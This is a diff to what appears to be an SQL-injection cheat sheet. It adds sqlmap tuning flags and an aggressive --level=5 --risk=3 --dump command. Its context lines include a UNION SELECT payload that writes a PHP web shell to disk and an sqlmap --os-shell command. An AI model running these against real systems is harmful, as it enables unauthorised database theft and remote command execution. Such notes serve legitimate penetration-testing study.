@@ -392,6 +392,12 @@ cn') UNION SELECT "", '<?php system($_REQUEST[0]); ?>',"","" into outfile '/var/
 ```bash
 sqlmap -hh
 
+# Advanced tuning
+--code=200 # HTTP Status code 200 = TRUE
+--titles 'Admin Panel' # Webpage title
+--string=success # Successful strings
+--text-only # Removes all HTML tags and compares based on the textual content
+--technique=BEU # specifu SQLi technique
 The technique characters `BEUSTQ` refers to the following:
 - `B`: Boolean-based blind
 - `E`: Error-based
@@ -425,6 +431,9 @@ sqlmap -u www.target.com --data='id=1' --method PUT
 
 # Force sqlmap to use `OR` payloads with `--risk=3`
 sqlmap -r req.txt --batch --dump --risk=3
+
+# Force sqlmap to test more boundaries `--level=5`
+sqlmap -r req.txt --batch --dump --level=5 --risk=3
 
 # Specifying a prefix or suffix
 sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
@@ -468,7 +477,7 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 # Debug errors
 sqlmap -r req.txt --batch --dump --parse-errors -t /tmp/traffic.txt -v 6
 
-# Debug errors with proxy + Burp
+# Debug errors with proxy
 sqlmap -r req.txt --batch --dump --parse-errors -t /tmp/traffic.txt -v 6 --proxy
 ```
 
